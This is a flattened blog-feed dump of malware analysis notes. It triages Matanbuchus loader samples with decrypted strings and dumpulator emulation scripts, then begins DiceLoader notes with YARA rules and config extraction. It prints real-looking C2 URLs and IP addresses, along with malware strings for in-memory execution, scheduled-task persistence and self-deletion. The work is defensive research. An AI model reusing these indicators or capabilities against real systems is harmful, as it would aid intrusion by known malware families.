b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/58a673023bbc7f2726e3b7ac917a43d9306692dc87b638ee21b98705a3262ccd.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin [] /tmp/samples/fa6500946210334d397d612d5ee9b11456316e25672bc60c1267bbdb002af9c7.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/60f030597c75f9df0f7a494cb5432b600d41775cfe5cf13006c1448fa3a68d8d.bin [b&#39;VirtualAlloc&#39;, b&#39;start dll HackCheck&#39;, b&#39;http://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;kernel32.dll&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;Netapi32.dll x00&#39;, b&#39;LoadLibraryA&#39;, b&#39;http://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/8.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Microsoft Outlook 16.0.5197; ms-office; MSOffice 16) x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;Wkscli.dll x00&#39;, b&#39;https://telemetrysystemcollection.com/m8YYdu/mCQ2U9/home.aspx x00&#39;, b&#39;VirtualFree&#39;, b&#39;https://collectiontelemetrysystem.com/m8YYdu/mCQ2U9/auth.aspx x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/e58b9bbb7bcdf3e901453b7b9c9e514fed1e53565e3280353dccc77cde26a98e.bin [b&#39;C: Windows System32 schtasks.exe x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39; /TR &#34;%windir% system32 regsvr32.exe -e x00&#39;, b&#39;%ProgramData% x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;%PROGRAMFILES% Opera Opera.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;Dll Uinstall x00&#39;, b&#39;%COMPUTERNAME% x00&#39;, b&#39;https://manageintel.com/RKyiihqXQiyE/xukYadevoVow/BhJM.xml x00&#39;, b&#39;UnregisterServer x00&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://manageintel.com/RKyiihqXQiyE/xukYadevoVow/QXms.xml x00&#39;, b&#39;.ocx x00&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL% x00&#39;, b&#39;%PROCESSOR_REVISION% x00&#39;] /tmp/samples/a3c896e23c86e47bcb77096e743010546cd7699e0189344d11b9c642b89deef1.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] /tmp/samples/f27821dddb17b6c8d59fb2ada1e90eac8d561476e5af3a6be064177683b0eee9.bin [b&#39;VirtualAlloc&#39;, b&#39;Windows-Update-Agent/11.0.10011.16384 Client-Protocol/2.0 x00&#39;, b&#39;rundll32.exe x00&#39;, b&#39;9npSEGB3kg9suo3Yit x00&#39;, b&#39;kernel32.dll&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;Shlwapi.dll x00&#39;, b&#39;WS2_32.dll x00&#39;, b&#39;DllRegisterServer x00&#39;, b&#39;loaddll32.exe x00&#39;, b&#39;Shell32.dll x00&#39;, b&#39;Wininet.dll x00&#39;, b&#39;USER32.dll x00&#39;, b&#39;GetProcAddress&#39;, b&#39;LoadLibraryA&#39;, b&#39;IPHLPAPI.DLL x00&#39;, b&#39;https://azure-dbupdate.at/vuUwUx/FyNRoM/auth.php x00&#39;, b&#39;https://azure-updatedb.at/vuUwUx/FyNRoM/index.php x00&#39;, b&#39;VirtualFree&#39;, b&#39;regsvr32.exe x00&#39;, b&#39;%PROCESSOR_LEVEL%&#39;] . Sample Using ADV String Obfuscation . A newer sample uses some type of ADV string obfuscation b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e. We can probably use our old dumpulator tricks for this. . The start of the .text section contains a vtable with all of the string decryption functions. . from dumpulator import Dumpulator, syscall from dumpulator.native import * @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) functs = [0x74040976,0x740409A4,0x740409BA,0x74040998,0x7404098C,0x7403F910,0x7403F91C,0x7403F967,0x7403F9B2,0x7403F9FD,0x7403FA48,0x7403FA93,0x7403FADE,0x7403FB44,0x7403FBAE,0x7403FC20,0x7403FC98,0x7403FD06,0x7403FD74,0x7403FDDD,0x7403FE43,0x7403FEBF,0x7403FF46,0x7403FFD5,0x74040065,0x740400DC,0x74040146,0x740401A2,0x740401FE,0x7404025A,0x740402B6,0x74040312,0x74040378,0x740403D4,0x74040438,0x7404048B,0x740404DE,0x74040542,0x7404059E,0x740405F1,0x74040644,0x740406A0,0x74040706,0x7404074F,0x740407AB,0x74040807,0x7404085A,0x740408B6,0x7404091A] for fn in functs: dp.call(fn,[]) str_tbl_start = 0x7407FDB4 str_tbl_end = 0x7407FE7C str_tbl_start = 0x7407E000 str_tbl_end = 0x74080224 for ptr in range(str_tbl_start,str_tbl_end,4): try: ss = dp.read_str(dp.read_ptr(ptr)) if len(ss) &gt; 4: print(ss) except: continue . Failed to read module data C: Users IEUser Desktop DLLLoader32_82D6.exe &#34;C: Users IEUser Desktop DLLLoader32_82D6.exe&#34; e03ed Uninstall 3fe11 Running exe Starting the exe with parameters Run CMD in memory Run PS in memory Running dll in memory #3 (DllInstall(Unstall)) Running dll in memory #3 (DllInstall(Install)) Regsvr32 &amp; Execute MemLoadDllMain || MemLoadExe zNETjp 5deb9c Run EXE with admin rights TAMfm RunDll32 &amp; Execute Crypt update &amp; Bots upgrade Running dll in memory #2 (DllRegisterServer) tbesqn . Different Sample From Same Family . This is clearly a different sample based on the decrypted strings, but it seems to be part of the matanbuchus family... maybe this is a payload instead of a loader? The sample matches analysis from this blog: Introduction of a PE file extractor for various situations&gt; . We need to figure out why these samples are so different... . Taking a Closer Look At Obfuscated Samples . Obfuscated sample . b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e - does match yara (2021-11-12 11:47:44 UTC) | . Rony . bd68ecd681b844232f050c21c1ea914590351ef64e889d8ef37ea63bd9e2a2ec - doesn&#39;t match yara (2022-06-14 10:30:32 UTC) | . These samples appear to be the same (they are likely the &quot;payload&quot; portion of Matanbuchus) but the earlier sample uses obfuscated string encryption, while the newer sample uses the simpler stack based string encryption. . Fixing our Yara Rule to Match the Stack Based String Encryption Payload (as well as loaders) . This was a simple fix! The payload does not contain the murmur hash code, once we removed that the yara rule matched all samples. . Let&#39;s Take a Look At the Obfusacated Strings . We know that the one sample we have that is a &quot;payload&quot; will likely have some of the same strings as the obfuscated sample so let&#39;s pull these our first as a reference. . b&#39;Content-Length: x00&#39; b&#39;C: Windows System32 WindowsPowerShell v1.0 powershell.exe x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;DllRegisterServer x00&#39; b&#39;097f5m x00&#39; b&#39;Running dll in memory #3 (DllInstall(Unstall)) x00&#39; b&#39;runas x00&#39; b&#39;.exe x00&#39; b&#39;timeout /t 3 &amp;&amp; move /Y x00&#39; b&#39;Running dll in memory #3 (DllInstall(Install)) x00&#39; b&#39;.exe x00&#39; b&#39;.exe x00&#39; b&#39;TiC7 x00&#39; b&#39;.nls x00&#39; b&#39;Run PS in memory x00&#39; b&#39;Admin x00&#39; b&#39;%LOCALAPPDATA% x00&#39; b&#39;DllInstall x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;collectiontelemetrysystem.com x00&#39; b&#39;Not in domain x00&#39; b&#39;regsvr32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;%APPDATA% x00&#39; b&#39;41.4.0 x00&#39; b&#39;8QN04 x00&#39; b&#39;64 Bit x00&#39; b&#39;8S2x x00&#39; b&#39;Starting the exe with parameters x00&#39; b&#39;C: Windows System32 cmd.exe /c x00&#39; b&#39;cmd.exe /c x00&#39; b&#39;High start exe x00&#39; b&#39;Running exe x00&#39; b&#39;User-Agent: x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;Content-Type: application/x-www-form-urlencoded x00&#39; b&#39;%APPDATA% x00&#39; b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ x00&#39; b&#39; explorer.exe x00&#39; b&#39;MemLoadDllMain || MemLoadExe x00&#39; b&#39;Run CMD in memory x00&#39; b&#39;3CEk x00&#39; b&#39;3m7x x00&#39; b&#39;.nls x00&#39; b&#39;%APPDATA% x00&#39; b&#39;NCST x00&#39; b&#39;BCha x00&#39; b&quot;/c ECHO &#39;You must restart the program to resolve a critical error!&#39; &amp;&amp; start x00&quot; b&#39;7eriel x00&#39; b&#39;%APPDATA% x00&#39; b&#39;.nls x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&quot; &#39;z{VIS rA6 rb x00&quot; b&#39;%LOCALAPPDATA% x00&#39; b&#39;IsWow64Process x00&#39; b&#39;rundll32.exe x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;kernel32 x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39;User x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39;.nls x00&#39; b&#39; r n r n x00&#39; b&#39; rXOGONSEzBER% x00&#39; b&#39;%PROCESSOR_REVISION% x00&#39; b&#39; nost: x00&#39; b&#39;MemLoadShellCode x00&#39; b&#39;Q6X6 x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;cmd.exe x00&#39; b&#39;%02X-%02X-%02X-%02X-%02X-%02X x00&#39; b&#39;Running dll in memory #2 (DllRegisterServer) x00&#39; b&#39;Crypt update &amp; Bots upgrade x00&#39; b&#39;timeout /t 3 &amp;&amp; del x00&#39; b&#39;3fe11 x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;%PROCESSOR_ARCHITECTURE% x00&#39; b&#39;NSeyDX x00&#39; b&#39;%APPDATA% x00&#39; b&#39;4nes x00&#39; b&#39;jpofxs x00&#39; b&#39;Not in domain x00&#39; b&#39;DllInstall x00&#39; b&#39; &amp;&amp; rd /s /q x00&#39; b&#39; &amp;&amp; regsvr32.exe -e &quot; x00&#39; b&#39;32 Bit x00&#39; b&#39;%USERDOMAIN% x00&#39; . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) functs = [0x74040976,0x740409A4,0x740409BA,0x74040998,0x7404098C,0x7403F910,0x7403F91C,0x7403F967,0x7403F9B2,0x7403F9FD,0x7403FA48,0x7403FA93,0x7403FADE,0x7403FB44,0x7403FBAE,0x7403FC20,0x7403FC98,0x7403FD06,0x7403FD74,0x7403FDDD,0x7403FE43,0x7403FEBF,0x7403FF46,0x7403FFD5,0x74040065,0x740400DC,0x74040146,0x740401A2,0x740401FE,0x7404025A,0x740402B6,0x74040312,0x74040378,0x740403D4,0x74040438,0x7404048B,0x740404DE,0x74040542,0x7404059E,0x740405F1,0x74040644,0x740406A0,0x74040706,0x7404074F,0x740407AB,0x74040807,0x7404085A,0x740408B6,0x7404091A] functs = [0x7403FC98] for fn in functs: dp.call(fn,[]) data_start = 0x7407E000 data_end = 0x74080228 for ptr in range(data_start,data_end,4): try: ss = dp.read_str(dp.read_ptr(ptr)) if len(ss) &gt;= 4: print(ss) except: continue print(&quot; n n n === n&quot;) print(dp.read_str(dp.read_ptr(0x7407FDFC ))) . Failed to read module data C: Users IEUser Desktop DLLLoader32_82D6.exe &#34;C: Users IEUser Desktop DLLLoader32_82D6.exe&#34; Q6X6 zkC7 rJqU e03ed 3CEk Uninstall 3fe11 Running exe au5o Starting the exe with parameters 3m7x Run CMD in memory Run PS in memory Running dll in memory #3 (DllInstall(Unstall)) Running dll in memory #3 (DllInstall(Install)) Regsvr32 &amp; Execute MemLoadDllMain || MemLoadExe b2tb hszA zNETjp 5deb9c DS2x Run EXE with admin rights TAMfm RunDll32 &amp; Execute wgjv Crypt update &amp; Bots upgrade f1da nX8y Running dll in memory #2 (DllRegisterServer) tbesqn === Running exe . FILE_PATH = &#39;/tmp/samples/b9b399dbb5d901c16d97b7c30cc182736cd83a7c53313194a1798d61f9c7501e.bin&#39; file_data = open(FILE_PATH,&#39;rb&#39;).read() def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(data): return re.match(B&quot;^[ s!-~]+ 0*$&quot;, data) is not None # .text:74049A7D C6 45 B8 0D mov byte ptr [ebp-48h], 13 # .text:74049A81 C7 45 E0 6E 60 69 23 mov dword ptr [ebp-20h], 2369606Eh # .text:74049A88 C7 45 E4 68 75 68 2D mov dword ptr [ebp-1Ch], 2D687568h # .text:74049A8F C7 45 E8 22 6E 2D 00 mov dword ptr [ebp-18h], 2D6E22h # .text:74049A96 C7 45 EC DA 4E 1E 00 mov dword ptr [ebp-14h], 1E4EDAh test_data = unhex(&#39;895db4c645b80dc745e06e606923c745e46875682dc745e8226e2d00c745ecda4e1e0052&#39;) stack_strings = [] string_egg = rb&#39;(?P&lt;a&gt;(?: xC6 x45..){1})(?P&lt;b&gt;(?: xC7 x45.....){2,})&#39; for m in re.finditer(string_egg, file_data): match_data = m.group(0) #print(tohex(match_data)) key = m[&#39;a&#39;][3] raw_data = m[&#39;b&#39;] str_data = b&#39;&#39; for i in range(0,len(raw_data),7): str_data += raw_data[i:i+7][-4:] print(xor_decrypt(str_data, bytes([key]))) . b&#39;Shell32.dllR&#39; b&#39;Matanbuc&#39; b&#39; HTTP/1.&#39; b&#39;User-Agent: &#39; b&#39;DllInsta&#39; b&#39;DllInsta&#39; b&#39;cmd.exe /c x05 xdfK x1b x05&#39; b&#39; &amp;&amp; rd /s /q&#39; b&#39;cmd.exe /c r xd7C x13 r&#39; . # .text:7404406B C7 45 AC 71 5D 48 5D mov dword ptr [ebp-54h], 5D485D71h # .text:74044072 C7 45 B0 52 5E 49 5F mov dword ptr [ebp-50h], 5F495E52h # .text:74044079 C7 45 B4 54 49 4F 0A mov dword ptr [ebp-4Ch], 0A4F4954h # .text:74044080 66 C7 45 B8 0A 0A mov word ptr [ebp-48h], 0A0Ah # .text:74048CF5 C6 45 B8 31 mov byte ptr [ebp-48h], 31h ; &#39;1&#39; # .text:74048CF9 C7 45 E0 75 5D 5D 78 mov dword ptr [ebp-20h], 785D5D75h # .text:74048D00 C7 45 E4 5F 42 45 50 mov dword ptr [ebp-1Ch], 5045425Fh # .text:74048D07 66 C7 45 E8 5D 5D mov word ptr [ebp-18h], 5D5Dh # .text:74048D0D 88 5D EA mov [ebp-16h], bl # .text:74048D10 C7 45 EC DA 4E 1E 00 mov dword ptr [ebp-14h], 1E4EDAh # .text:740454A9 30 14 08 xor [eax+ecx], dl # .text:740454AC 41 inc ecx # .text:740454AD 83 F9 1D cmp ecx, 1Dh . File &#34;&lt;ipython-input-82-89ec58536910&gt;&#34;, line 18 80 b0 d8 ff 07 74 a8 40 83 f8 06 ^ SyntaxError: invalid syntax . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) start_addr = 0x74044390 end_addr = 0x740443C1 dp.start(start_addr, end=end_addr) dp.read(dp.regs.ebx, 14) . Failed to read module data . bytearray(b&#39;193.56.146.60 &#39;) . String Decryption Recap . With these older samples, there are 3 different string decryption methods used . Stack strings build with DWORDs that are decrypted using a single byte XOR, the byte is the first byte pushed onto the stack string (this is the same method used for small strings in the new samples) | Global strings that are generated using constructors which have some light obfuscation. To deal with these we simply emulate all of the constructors and scrape the global strings from the .data section of the PE. | The third and most complex method relies on two calls to functions used to build the encrypted string and then a simple single-byte XOR to decrypt the string. | . Complex Third String Decryption Method . c6 45 c4 53 57 6a 08 740458C7 .text:740436A5 BE DA 4E 1E 00 mov esi, 1E4EDAh .text:740436AA 89 9D 28 FF FF FF mov [ebp+var_D8], ebx .text:740436B0 89 9D 2C FF FF FF mov [ebp+var_D4], ebx BE DA ?? ?? ?? 89 ?? ?? ?? ?? ?? 89 .text:740480FF 89 5D B0 mov [ebp-50h], ebx .text:74048102 8B D3 mov edx, ebx .text:74048104 89 5D B4 mov [ebp-4Ch], ebx .text:74048107 89 5D B8 mov [ebp-48h], ebx .text:7404810A C6 45 BC 1A mov byte ptr [ebp-44h], 1Ah 89 ?? ?? 8b ?? 89 ?? ?? 89 ?? ?? c6 45 .text:740431A2 72 F7 jb short loc_7404319B .text:740431A4 88 59 0C mov [ecx+12], bl .text:740438E2 72 F7 jb short loc_740438DB .text:740438E4 88 59 0B mov [ecx+0Bh], bl . from dumpulator import Dumpulator, syscall from dumpulator.native import * import pefile @syscall def ZwQueryVolumeInformationFile(dp: Dumpulator, FileHandle: HANDLE, IoStatusBlock: P(IO_STATUS_BLOCK), FsInformation: PVOID, Length: ULONG, FsInformationClass: FSINFOCLASS ): return STATUS_SUCCESS def emulate(start_addr, end_addr, ret_reg, str_len): dp = Dumpulator(&quot;/tmp/b9b.dmp&quot;, quiet=True) dp.start(dp.regs.eip, end=dp.read_ptr(dp.regs.esp)) dp.start(start_addr, end=end_addr) return dp.read(dp.regs.__getitem__(ret_reg), str_len) pe = pefile.PE(data=file_data) em_egg = rb&#39; xBE xDA... x89..... x89.+?(?= x72 xf7 x88)&#39; for m in re.finditer(em_egg, file_data): start_offset = m.start() end_offset = m.end() + 2 start_addr = pe.get_rva_from_offset(start_offset) + 0x74030000 end_addr = pe.get_rva_from_offset(end_offset) + 0x74030000 str_len = file_data[end_offset + 2] if file_data[end_offset + 1] == 0x5f: reg_name = &#39;edi&#39; elif file_data[end_offset + 1] == 0x59: reg_name = &#39;ecx&#39; print(f&quot;Testing: {hex(start_addr)}&quot;) try: print(emulate(start_addr, end_addr, reg_name, str_len )) except: print(&quot;fail&quot;) continue . Testing: 0x74042f48 Failed to read module data bytearray(b&#39;IPHLPAPI.DLL&#39;) Testing: 0x740430ce Failed to read module data bytearray(b&#39;IPHLPAPI.DLL&#39;) Testing: 0x740436a5 Failed to read module data bytearray(b&#39; xfb xcc xf5 xfc xd5i xd2 t xf7nz&#39;) Testing: 0x74043814 Failed to read module data bytearray(b&#39; x98 xe7 xe1 x13- x0fo xc0hUY&#39;) Testing: 0x74043991 Failed to read module data fail .",
            "url": "https://research.openanalysis.net/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html",
            "relUrl": "/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html",
            "date": " • Jun 19, 2022"
        }
        
    
  
    
        ,"post2": {
            "title": "Diceloader Triage Notes",
            "content": "Overview . According to Mandiant.. . the DiceLoader framework, a known toolkit that helps attackers gain a foothold in infected systems and perform reconnaissance . According to Twitter... . twitter:https://twitter.com/c3rb3ru5d3d53c/status/1348667319665487874 . and ... #FIN7As reported by @KorbenD_Intel, the initial powershell script use DeflateStream method for uncompress the zip in memory and extract it. This execute the second layer that heavily obfuscated. More 70 functions are used for reorder the data for sensible strings and the implant pic.twitter.com/f8CTvtaf2m . &mdash; Arkbird (@Arkbird_SOLG) September 29, 2020 . and ... For those tracking #FIN7 - #TAKEOUT is the powershell memory dropper that has been seen dropping #CARBANAK OR #DICELOADER - there&#39;s some confusion going on..ClearTemp.ps1 files == TAKEOUTPayloads embedded == CARBANAK || DICELOADER . &mdash; Dan Perez - On Paternity Leave (@MrDanPerez) January 7, 2021 . According to Dan Perez at Mandiant... . For those tracking #FIN7 - #TAKEOUT is the powershell memory dropper that has been seen dropping #CARBANAK OR #DICELOADER - there&#39;s some confusion going on.. ClearTemp.ps1 files == TAKEOUT Payloads embedded == CARBANAK || DICELOADER . References . MalwareBazaar &quot;diceloader&quot; tag- Attributed to GOLD NIAGARA (carbon spider) | Attributed to FIN7 | Possible that Lizar is an earlier version of Diceloader | . Triage Notes . Sample: 2d88767c424d05330839e568b32f9f52962df56b1d3021f69930167fe623efd1 . Creation Time: 2021-07-15 15:46:07 UTC . First Submission: 2022-03-20 23:22:32 UTC . The sample is an x64 DLL with two exports | One of the exports is a reflective PE loader (possibly copy-paste from metasploit) | There is a mutex string Global %08x that is built as a stack string | . .text:0000000180001749 C7 44 24 30 47 6C 6F 62 mov dword ptr [rsp+228h+var_mutex], 626F6C47h .text:0000000180001751 C7 44 24 34 61 6C 5C 25 mov dword ptr [rsp+228h+var_mutex+4], 255C6C61h .text:0000000180001759 C7 44 24 38 30 38 78 00 mov dword ptr [rsp+228h+var_mutex+8], 783830h . The .data section containst two encrypted blobs with a 32-byte key sandwitched between them. | The first encrypted blob seems to contain a port number | . 01 bb 01 11 bb 01 00 00 00 90 f1 . The second encrypted blob contains C2 IP addresses separated with a | | . 46.17.107.7|185.250.151.33 x00 . Yara . Initial Attempt . import &quot;pe&quot; rule diceloader { meta: description = &quot;Identifies diceloader&quot; strings: // gobal stack string // C7 44 24 30 47 6C 6F 62 mov dword ptr [rsp+228h+var_mutex], 626F6C47h // C7 44 24 34 61 6C 5C 25 mov dword ptr [rsp+228h+var_mutex+4], 255C6C61h // C7 44 24 38 30 38 78 00 mov dword ptr [rsp+228h+var_mutex+8], 783830h $x1 = { C7 ?? ?? ?? 47 6C 6F 62 C7 ?? ?? ?? 61 6C 5C 25 C7 ?? ?? ?? 30 38 78 00 } // fnv1 // 48 FF C1 inc rcx // 33 C2 xor eax, edx // 69 C0 93 01 00 01 imul eax, 1000193h $x2 = { 48 FF C1 33 C2 69 C0 93 01 00 01 } // sleep(1000) // B9 10 27 00 00 mov ecx, 2710h ; dwMilliseconds // FF 15 B3 13 00 00 call cs:Sleep $x3 = {B9 10 27 00 00 ff} // hash for NtFlushInstructionCache // 81 F9 B8 0A 4C 53 cmp ecx, 534C0AB8h // 75 16 jnz short loc_7FFA3BA4121E $x4 = { 81 F9 B8 0A 4C 53 75 } condition: pe.is_64bit() and all of ($x*) } . Hunt . rule diceloader_hunt { meta: description = &quot;Identifies diceloader - danger hunt rule&quot; strings: // Mod 31 for key length // C1 FA 04 sar edx, 4 // 8B C2 mov eax, edx // C1 E8 1F shr eax, 1Fh // 03 D0 add edx, eax // 6B C2 1F imul eax, edx, 1Fh $x1 = { C1 FA 04 8B C2 C1 E8 1F 03 D0 6B C2 1F } condition: all of ($x*) } . Final Rule . import &quot;pe&quot; rule diceloader { meta: description = &quot;Identifies diceloader&quot; strings: // Mod 31 for key length // C1 FA 04 sar edx, 4 // 8B C2 mov eax, edx // C1 E8 1F shr eax, 1Fh // 03 D0 add edx, eax // 6B C2 1F imul eax, edx, 1Fh $mod = { C1 FA 04 8B C2 C1 E8 1F 03 D0 6B C2 1F } // Reflective loader - not in all versions // B8 4D 5A 00 00 mov eax, &#39;ZM&#39; // 66 41 39 07 cmp [r15], ax // 75 1B jnz short loc_18000106D // 49 63 57 3C movsxd rdx, dword ptr [r15+3Ch] // 48 8D 4A C0 lea rcx, [rdx-40h] // 48 81 F9 BF 03 00 00 cmp rcx, 3BFh // 77 0A ja short loc_18000106D // 42 81 3C 3A 50 45 00 00 cmp dword ptr [rdx+r15], &#39;EP&#39; // 74 05 jz short loc_180001072 $reflective = { B8 4D 5A 00 00 66 41 39 07 75 ?? 49 63 57 3C 48 8D 4A C0 48 81 F9 BF 03 00 00 77 ?? 42 81 3C 3A 50 45 00 00 } // Fnv1 Algrithm - only in new versions $fnv1 = {33 ?? 69 ?? 93 01 00 01} condition: pe.is_64bit() and $mod and ($reflective or $fnv1) } . Config Extraction . We want to pull out the C2 IP addresses and ports. . Research . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct import re def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) . FILE_PATH = &#39;/tmp/087435ef6cddc58d40ba6ba8b4bb60b2ead9873bf1cb5c0702bbf31e3199b343.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break # Find the key based on it being passed as an arg # # BD 1F 00 00 00 